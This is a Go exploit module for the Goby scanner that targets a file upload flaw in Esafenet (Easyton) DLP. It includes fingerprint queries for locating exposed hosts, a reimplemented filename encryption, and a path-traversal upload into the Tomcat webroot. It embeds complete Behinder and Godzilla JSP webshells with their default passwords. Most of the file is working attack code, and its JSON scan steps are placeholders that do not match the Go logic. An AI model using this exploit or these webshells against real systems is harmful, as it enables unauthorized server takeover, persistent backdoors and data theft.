package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Esaiton DLP UploadFileFromClientServiceForClient file upload vulnerability",
    "Description": "<p>Easyton Data Leakage Protection System is a platform that records, warns, and blocks user leaks, and audits user behavior.</p><p>There is a file upload vulnerability in the Easyton data leakage prevention system.</p>",
    "Product": " Easyton DLP",
    "Homepage": "http://www.esafenet.com",
    "DisclosureDate": "2022-03-31",
    "Author": "171583065@qq.com",
    "FofaQuery": "(title==\"数据泄露防护(DLP)系统\" && body=\"/CDGServer3/index.jsp\") || (body=\"CDGServer3\" && body=\"DLP\") || (body=\"亿赛通数据脱敏系统\" && body=\"mainBtnPanel\")",
    "GobyQuery": "(title==\"数据泄露防护(DLP)系统\" && body=\"/CDGServer3/index.jsp\") || (body=\"CDGServer3\" && body=\"DLP\") || (body=\"亿赛通数据脱敏系统\" && body=\"mainBtnPanel\")",
    "Level": "3",
    "Impact": "<p>Attackers can directly upload a webshell to execute arbitrary code and control the server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.esafenet.com\">http://www.esafenet.com</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://www.esafenet.com"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "亿赛通 DLP UploadFileFromClientServiceForClient 文件上传漏洞",
            "Product": "亿赛通-DLP",
            "Description": "<p>亿赛通数据泄露防护系统是对用户泄密行为进行记录、告警、阻断，并对用户行为进行审计的平台。</p><p>亿赛通数据泄露防护系统存在文件上传漏洞。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.esafenet.com\">http://www.esafenet.com</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可直接上传 webshell 执行任意代码，控制服务器。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Esaiton DLP UploadFileFromClientServiceForClient file upload vulnerability",
            "Product": " Easyton DLP",
            "Description": "<p>Easyton Data Leakage Protection System is a platform that records, warns, and blocks user leaks, and audits user behavior.</p><p>There is a file upload vulnerability in the Easyton data leakage prevention system.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.esafenet.com\">http://www.esafenet.com</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can directly upload a webshell to execute arbitrary code and control the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-13",
    "PocId": "10822"
}`

	getTransferEncryptString52ba296a := func(bytesEncrypted []int) string {
		v1 := bytesEncrypted
		v2 := len(v1)
		var v3 []byte

		for v4 := 0; v4 < v2; v4++ {
			v5 := v1[v4]
			v6 := v5 >> 4
			v10 := v6 & 15
			if v10 == 0 {
				v10 |= 80
			} else {
				v10 |= 64
			}

			v12 := v5 & 15
			if v12 == 0 {
				v12 |= 80
			} else {
				v12 |= 64
			}

			v3 = append(v3, byte(v10))
			v3 = append(v3, byte(v12))
		}

		return string(v3)
	}

	blockEncrypt52ba296a := func(v0 []byte, v1 int, v2 [][][]int) [16]int {
		T1 := []int{-966564955, -126059388, -294160487, -159679603, -855539, -697603139, -563122255, -1849309868, 1613770832, 33620227, -832084055, 1445669757, -402719207, -1244145822, 1303096294, -327780710, -1882535355, 528646813, -1983264448, -92439161, -268764651, -1302767125, -1907931191, -68095989, 1101901292, -1277897625, 1604494077, 1169141738, 597466303, 1403299063, -462261610, -1681866661, 1974974402, -503448292, 1033081774, 1277568618, 1815492186, 2118074177, -168298750, -2083730353, 1748251740, 1369810420, -773462732, -101584632, -495881837, -1411852173, 1647391059, 706024767, 134480908, -1782069422, 1176707941, -1648114850, 806885416, 932615841, 168101135, 798661301, 235341577, 605164086, 461406363, -538779075, -840176858, 1311188841, 2142417613, -361400929, 302582043, 495158174, 1479289972, 874125870, 907746093, -596742478, -1269146898, 1537253627, -1538108682, 1983593293, -1210657183, 2108928974, 1378429307, -572267714, 1580150641, 327451799, -1504488459, -1177431704, 0, -1041371860, 1075847264, -469959649, 2041688520, -1235526675, -731223362, -1916023994, 1740553945, 1916352843, -1807070498, -1739830060, -1336387352, -2049978550, -1143943061, -974131414, 1336584933, -302253290, -2042412091, -1706209833, 1714631509, 293963156, -1975171633, -369493744, 67240454, -25198719, -1605349136, 2017213508, 631218106, 1269344483, -1571728909, 1571005438, -2143272768, 93294474, 1066570413, 563977660, 1882732616, -235539196, 1673313503, 2008463041, -1344611723, 1109467491, 537923632, -436207846, -34344178, -1076702611, -2117218996, 403442708, 638784309, -1007883217, -1101045791, 899127202, -2008791860, 773265209, -1815821225, 1437050866, -58818942, 2050833735, -932944724, -1168286233, 840505643, -428641387, -1067425632, 427917720, -1638969391, -1545806721, 1143087718, 1412049534, 999329963, 193497219, -1941551414, -940642775, 1807268051, 672404540, -1478566279, -1134666014, 369822493, -1378100362, -606019525, 1681011286, 1949973070, 336202270, -1840690725, 201721354, 1210328172, -1201906460, -1614626211, -1110191250, 1135389935, -1000185178, 965841320, 831886756, -739974089, -226920053, -706222286, -1949775805, 1849112409, -630362697, 26054028, -1311386268, -1672589614, 1235855840, -663982924, -1403627782, -202050553, -806688219, -899324497, -193299826, 1202630377, 268961816, 1874508501, -260540280, 1243948399, 1546530418, 941366308, 1470539505, 1941222599, -1748580783, -873928669, -1579295364, -395021156, 1042226977, -1773450275, 1639824860, 227249030, 260737669, -529502064, 2084453954, 1907733956, -865704278, -1874310952, 100860677, -134810111, 470683154, -1033805405, 1781871967, -1370007559, 1773779408, 394692241, -1715355304, 974986535, 664706745, -639508168, -336005101, 731420851, 571543859, -764843589, -1445340816, 126783113, 865375399, 765172662, 1008606754, 361203602, -907417312, -2016489911, -1437248001, 1344809080, -1512054918, 59542671, 1503764984, 160008576, 437062935, 1707065306, -672733647, -2076032314, -798463816, -2109652541, 697932208, 1512910199, 504303377, 2075177163, -1470868228, 1841019862, 739644986}
		T2 := []int{-1513725085, -2064089988, -1712425097, -1913226373, 234877682, -1110021269, -1310822545, 1418839493, 1348481072, 50462977, -1446090905, 2102799147, 434634494, 1656084439, -431117397, -1695779210, 1167051466, -1658879358, 1082771913, -2013627011, 368048890, -340633255, -913422521, 201060592, -331240019, 1739838676, -44064094, -364531793, -1088185188, -145513308, -1763413390, 1536934080, -1032472649, 484572669, -1371696237, 1783375398, 1517041206, 1098792767, 49674231, 1334037708, 1550332980, -195975771, 886171109, 150598129, -1813876367, 1940642008, 1398944049, 1059722517, 201851908, 1385547719, 1699095331, 1587397571, 674240536, -1590192490, 252314885, -1255171430, 151914247, 908333586, -1692696448, 1038082786, 651029483, 1766729511, -847269198, -1612024459, 454166793, -1642232957, 1951935532, 775166490, 758520603, -1294176658, -290170278, -77881184, -157003182, 1299594043, 1639438038, -830622797, 2068982057, 1054729187, 1901997871, -1760328572, -173649069, 1757008337, 0, 750906861, 1614815264, 535035132, -931548751, -306816165, -1093375382, 1183697867, -647512386, 1265776953, -560706998, -728216500, -391096232, 1250283471, 1807470800, 717615087, -447763798, 384695291, -981056701, -677753523, 1432761139, -1810791035, -813021883, 283769337, 100925954, -2114027649, -257929136, 1148730428, -1171939425, -481580888, -207466159, -27417693, -1065336768, -1979347057, -1388342638, -1138647651, 1215313976, 82966005, -547111748, -1049119050, 1974459098, 1665278241, 807407632, 451280895, 251524083, 1841287890, 1283575245, 337120268, 891687699, 801369324, -507617441, -1573546089, -863484860, 959321879, 1469301956, -229267545, -2097381762, 1199193405, -1396153244, -407216803, 724703513, -1780059277, -1598005152, -1743158911, -778154161, 2141445340, 1715741218, 2119445034, -1422159728, -2096396152, -896776634, 700968686, -747915080, 1009259540, 2041044702, -490971554, 487983883, 1991105499, 1004265696, 1449407026, 1316239930, 504629770, -611169975, 168560134, 1816667172, -457679780, 1570751170, 1857934291, -280777556, -1497079198, -1472622191, -1540254315, 936633572, -1947043463, 852879335, 1133234376, 1500395319, -1210421907, -1946055283, 1689376213, -761508274, -532043351, -1260884884, -89369002, 133428468, 634383082, -1345690267, -1896580486, -381178194, 403703816, -714097990, -1997506440, 1867130149, 1918643758, 607656988, -245913946, -948718412, 1368901318, 600565992, 2090982877, -1662487436, 557719327, -577352885, -597574211, -2045932661, -2062579062, -1864339344, 1115438654, -999180875, -1429445018, -661632952, 84280067, 33027830, 303828494, -1547542175, 1600795957, -106014889, -798377543, -1860729210, 1486471617, 658119965, -1188585826, 953803233, 334231800, -1288988520, 857870609, -1143838359, 1890179545, -1995993458, -1489791852, -1238525029, 574365214, -1844082809, 550103529, 1233637070, -5614251, 2018519080, 2057691103, -1895592820, -128343647, -2146858615, 387583245, -630865985, 836232934, -964410814, -1194301336, -1014873791, -1339450983, 2002398509, 287182607, -881086288, -56077228, -697451589, 975967766}
		T3 := []int{1671808611, 2089089148, 2006576759, 2072901243, -233963534, 1807603307, 1873927791, -984313403, 810573872, 16974337, 1739181671, 729634347, -31856642, -681396777, -1410970197, 1989864566, -901410870, -2103631998, -918517303, 2106063485, -99225606, 1508618841, 1204391495, -267650064, -1377025619, -731401260, -1560453214, -1343601233, -1665195108, -1527295068, 1922491506, -1067738176, -1211992649, -48438787, -1817297517, 644500518, 911895606, 1061256767, -150800905, -867204148, 878471220, -1510714971, -449523227, -251069967, 1905517169, -663508008, 827548209, 356461077, 67897348, -950889017, 593839651, -1017209405, 405286936, -1767819370, 84871685, -1699401830, 118033927, 305538066, -2137318528, -499261470, -349778453, 661212711, -1295155278, 1973414517, 152769033, -2086789757, 745822252, 439235610, 455947803, 1857215598, 1525593178, -1594139744, 1391895634, 994932283, -698239018, -1278313037, 695947817, -482419229, 795958831, -2070473852, 1408607827, -781665839, 0, -315833875, 543178784, -65018884, -1312261711, 1542305371, 1790891114, -884568629, -1093048386, 961245753, 1256100938, 1289001036, 1491644504, -817199665, -798245936, -282409489, -1427812438, -82383365, 1137018435, 1305975373, 861234739, -2053893755, 1171229253, -116332039, 33948674, 2139225727, 1357946960, 1011120188, -1615190625, -1461498968, 1374921297, -1543610973, 1086357568, -1886780017, -1834139758, -1648615011, 944271416, -184225291, -1126210628, -1228834890, -629821478, 560153121, 271589392, -15014401, -217121293, -764559406, -850624051, 202643468, 322250259, -332413972, 1608629855, -1750977129, 1154254916, 389623319, -1000893500, -1477290585, 2122513534, 1028094525, 1689045092, 1575467613, 422261273, 1939203699, 1621147744, -2120738431, 1339137615, -595614756, 577127458, 712922154, -1867826288, -2004677752, 1187679302, -299251730, -1194103880, 339486740, -562452514, 1591917662, 186455563, -612979237, -532948000, 844522546, 978220090, 169743370, 1239126601, 101321734, 611076132, 1558493276, -1034051646, -747717165, -1393605716, 1655096418, -1851246191, -1784401515, -466103324, 2039214713, -416098841, -935097400, 928607799, 1840765549, -1920204403, -714821163, 1322425422, -1444918871, 1823791212, 1459268694, -200805388, -366620694, 1706019429, 2056189050, -1360443474, 135794696, -1160417350, 2022240376, 628050469, 779246638, 472135708, -1494132826, -1261997132, -967731258, -400307224, -579034659, 1956440180, 522272287, 1272813131, -1109630531, -1954148981, -1970991222, 1888542832, 1044544574, -1245417035, 1722469478, 1222152264, 50660867, -167643146, 236067854, 1638122081, 895445557, 1475980887, -1177523783, -2037311610, -1051158079, 489110045, -1632032866, -516367903, -132912136, -1733088360, 288563729, 1773916777, -646927911, -1903622258, -1800981612, -1682559589, 505560094, -2020469369, -383727127, -834041906, 1442818645, 678973480, -545610273, -1936784500, -1577559647, -1988097655, 219617805, -1076206145, -432941082, 1120306242, 1756942440, 1103331905, -1716508263, 762796589, 252780047, -1328841808, 1425844308, -1143575109, 372911126}
		T4 := []int{1667474886, 2088535288, 2004326894, 2071694838, -219017729, 1802223062, 1869591006, -976923503, 808472672, 16843522, 1734846926, 724270422, -16901657, -673750347, -1414797747, 1987484396, -892713585, -2105369313, -909557623, 2105378810, -84273681, 1499065266, 1195886990, -252703749, -1381110719, -724277325, -1566376609, -1347425723, -1667449053, -1532692653, 1920112356, -1061135461, -1212693899, -33743647, -1819038147, 640051788, 909531756, 1061110142, -134806795, -859025533, 875846760, -1515850671, -437963567, -235861767, 1903268834, -656903253, 825316194, 353713962, 67374088, -943238507, 589522246, -1010606435, 404236336, -1768513225, 84217610, -1701137105, 117901582, 303183396, -2139055333, -488489505, -336910643, 656894286, -1296904833, 1970642922, 151591698, -2088526307, 741110872, 437923380, 454765878, 1852748508, 1515908788, -1600062629, 1381168804, 993742198, -690593353, -1280061827, 690584402, -471646499, 791638366, -2071685357, 1398011302, -774805319, 0, -303223615, 538992704, -50585629, -1313748871, 1532751286, 1785380564, -875870579, -1094788761, 960056178, 1246420628, 1280103576, 1482221744, -808498555, -791647301, -269538619, -1431640753, -67430675, 1128514950, 1296947098, 859002214, -2054843375, 1162203018, -101117719, 33687044, 2139062782, 1347481760, 1010582648, -1616922075, -1465326773, 1364325282, -1549533603, 1077985408, -1886418427, -1835881153, -1650607071, 943212656, -168491791, -1128472733, -1229536905, -623217233, 555836226, 269496352, -58651, -202174723, -757961281, -842183551, 202118168, 320025894, -320065597, 1600119230, -1751670219, 1145359496, 387397934, -993765485, -1482165675, 2122220284, 1027426170, 1684319432, 1566435258, 421079858, 1936954854, 1616945344, -2122213351, 1330631070, -589529181, 572679748, 707427924, -1869567173, -2004319477, 1179044492, -286381625, -1195846805, 336870440, -555845209, 1583276732, 185277718, -606374227, -522175525, 842159716, 976899700, 168435220, 1229577106, 101059084, 606366792, 1549591736, -1027449441, -741118275, -1397952701, 1650632388, -1852725191, -1785355215, -454805549, 2038008818, -404278571, -926399605, 926374254, 1835907034, -1920103423, -707435343, 1313788572, -1448484791, 1819063512, 1448540844, -185333773, -353753649, 1701162954, 2054852340, -1364268729, 134748176, -1162160785, 2021165296, 623210314, 774795868, 471606328, -1499008681, -1263220877, -960081513, -387439669, -572687199, 1953799400, 522133822, 1263263126, -1111630751, -1953790451, -1970633457, 1886425312, 1044267644, -1246378895, 1718004428, 1212733584, 50529542, -151649801, 235803164, 1633788866, 892690282, 1465383342, -1179004823, -2038001385, -1044293479, 488449850, -1633765081, -505333543, -117959701, -1734823125, 286339874, 1768537042, -640061271, -1903261433, -1802197197, -1684294099, 505291324, -2021158379, -370597687, -825341561, 1431699370, 673740880, -539002203, -1936945405, -1583220647, -1987477495, 218961690, -1077945755, -421121577, 1111672452, 1751693520, 1094828930, -1717981143, 757954394, 252645662, -1330590853, 1414855848, -1145317779, 370555436}
		S := []int{99, 124, 119, 123, -14, 107, 111, -59, 48, 1, 103, 43, -2, -41, -85, 118, -54, -126, -55, 125, -6, 89, 71, -16, -83, -44, -94, -81, -100, -92, 114, -64, -73, -3, -109, 38, 54, 63, -9, -52, 52, -91, -27, -15, 113, -40, 49, 21, 4, -57, 35, -61, 24, -106, 5, -102, 7, 18, -128, -30, -21, 39, -78, 117, 9, -125, 44, 26, 27, 110, 90, -96, 82, 59, -42, -77, 41, -29, 47, -124, 83, -47, 0, -19, 32, -4, -79, 91, 106, -53, -66, 57, 74, 76, 88, -49, -48, -17, -86, -5, 67, 77, 51, -123, 69, -7, 2, 127, 80, 60, -97, -88, 81, -93, 64, -113, -110, -99, 56, -11, -68, -74, -38, 33, 16, -1, -13, -46, -51, 12, 19, -20, 95, -105, 68, 23, -60, -89, 126, 61, 100, 93, 25, 115, 96, -127, 79, -36, 34, 42, -112, -120, 70, -18, -72, 20, -34, 94, 11, -37, -32, 50, 58, 10, 73, 6, 36, 92, -62, -45, -84, 98, -111, -107, -28, 121, -25, -56, 55, 109, -115, -43, 78, -87, 108, 86, -12, -22, 101, 122, -82, 8, -70, 120, 37, 46, 28, -90, -76, -58, -24, -35, 116, 31, 75, -67, -117, -118, 112, 62, -75, 102, 72, 3, -10, 14, 97, 53, 87, -71, -122, -63, 29, -98, -31, -8, -104, 17, 105, -39, -114, -108, -101, 30, -121, -23, -50, 85, 40, -33, -116, -95, -119, 13, -65, -26, 66, 104, 65, -103, 45, 15, -80, 84, -69, 22}
		v3 := v2[0]
		v4 := len(v3) - 1
		v5 := v3[0]
		v6 := (int(v0[v1])<<24 | int(v0[v1+1])<<16 | int(v0[v1+2])<<8 | int(v0[v1+3])) ^ v5[0]
		v7 := (int(v0[v1+4])<<24 | int(v0[v1+5])<<16 | int(v0[v1+6])<<8 | int(v0[v1+7])) ^ v5[1]
		v8 := (int(v0[v1+8])<<24 | int(v0[v1+9])<<16 | int(v0[v1+10])<<8 | int(v0[v1+11])) ^ v5[2]
		v9 := (int(v0[v1+12])<<24 | int(v0[v1+13])<<16 | int(v0[v1+14])<<8 | int(v0[v1+15])) ^ v5[3]

		for v14 := 1; v14 < v4; v14++ {
			v5 = v3[v14]
			v10 := T1[v6>>24&255] ^ T2[v7>>16&255] ^ T3[v8>>8&255] ^ T4[v9&255] ^ v5[0]
			v11 := T1[v7>>24&255] ^ T2[v8>>16&255] ^ T3[v9>>8&255] ^ T4[v6&255] ^ v5[1]
			v12 := T1[v8>>24&255] ^ T2[v9>>16&255] ^ T3[v6>>8&255] ^ T4[v7&255] ^ v5[2]
			v13 := T1[v9>>24&255] ^ T2[v6>>16&255] ^ T3[v7>>8&255] ^ T4[v8&255] ^ v5[3]
			v6 = v10
			v7 = v11
			v8 = v12
			v9 = v13
		}

		var v15 [16]int
		v5 = v3[v4]
		v16 := v5[0]
		v15[0] = S[v6>>24&255] ^ v16>>24
		v15[1] = S[v7>>16&255] ^ v16>>16
		v15[2] = S[v8>>8&255] ^ v16>>8
		v15[3] = S[v9&255] ^ v16
		v16 = v5[1]
		v15[4] = S[v7>>24&255] ^ v16>>24
		v15[5] = S[v8>>16&255] ^ v16>>16
		v15[6] = S[v9>>8&255] ^ v16>>8
		v15[7] = S[v6&255] ^ v16
		v16 = v5[2]
		v15[8] = S[v8>>24&255] ^ v16>>24
		v15[9] = S[v9>>16&255] ^ v16>>16
		v15[10] = S[v6>>8&255] ^ v16>>8
		v15[11] = S[v7&255] ^ v16
		v16 = v5[3]
		v15[12] = S[v9>>24&255] ^ v16>>24
		v15[13] = S[v6>>16&255] ^ v16>>16
		v15[14] = S[v7>>8&255] ^ v16>>8
		v15[15] = S[v8&255] ^ v16
		return v15
	}

	encrypt52ba296a := func(filename string) []int {
		v0 := []byte(filename)
		v1 := len(v0)
		v3 := 16 * (v1 / 16)
		v6 := [][][]int{{
			{-342861124, 86791594, -342861124, 86791594},
			{-1687357737, -1639931011, 1976629697, 1895607403},
			{704481670, -1212339461, -1032989894, -1299087535},
			{-1406183247, 462582346, -637558416, 1802427937},
			{993174990, 547411844, -111184140, -1842239275},
			{-319773055, -867143419, 890177521, -1489064156},
			{2122944733, -1294343720, -2015959511, 552093965},
			{-1515042966, 392930994, -1866645349, -1336604266},
			{-642525299, -824676033, 1583690148, -298829774},
			{-961219419, 141329818, 1443476542, -1204188148},
			{-489682231, -356741293, -1128973459, 76330849},
		}, {
			{-489682231, -356741293, -1128973459, 76330849},
			{-900678137, 1289631710, 1788033301, 2023050914},
			{-1641484170, -2037478951, 642584267, 302413751},
			{-536917677, 413563311, -1597798638, 877361532},
			{65897174, -950456068, -1201275203, -1802961298},
			{528163708, -994790870, 2134691393, 753729747},
			{948265661, -607153834, -1148683157, 1406258834},
			{1536719826, -481627157, 1615326525, -396774663},
			{1975220333, -1194162119, -2096292138, -2011275324},
			{-39508055, -848695212, 1004508911, 185811218},
			{-342861124, 86791594, -342861124, 86791594},
		}}
		var v00 []int
		var v8 [16]int
		if 0 != v3 {
			for v9 := 0; v9 < v3/16; v9++ {
				offset := v9 * 16
				v8 = blockEncrypt52ba296a(v0[offset:offset+16], 0, v6)
				v00 = append(v00, v8[:]...)
			}
		}
		if v3 != v1 {
			v4 := v1 - v3
			for v5 := 0; v5 < v4; v5++ {
				v00 = append(v00, int(v0[v3+v5])^v5)
			}
		}
		return v00
	}

	sendPayload52ba296a := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		filenameEncrypted := getTransferEncryptString52ba296a(encrypt52ba296a("a=1&fileName=/../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/" + filename))
		cfg := httpclient.NewPostRequestConfig("/CDGServer3/UploadFileFromClientServiceForClient?a=" + filenameEncrypted)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = content
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}

		cfgCheck := httpclient.NewGetRequestConfig("/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".jsp"
			rsp, err := sendPayload52ba296a(u, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "out.println")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName("java.util.Base64"); Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName("sun.misc.BASE64Decoder");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals("POST")){String k = "e45e329feb5d925b";session.putValue("u", k);Cipher c = Cipher.getInstance("AES");c.init(2, new SecretKeySpec(k.getBytes(), "AES"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			}
			rsp, err := sendPayload52ba296a(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
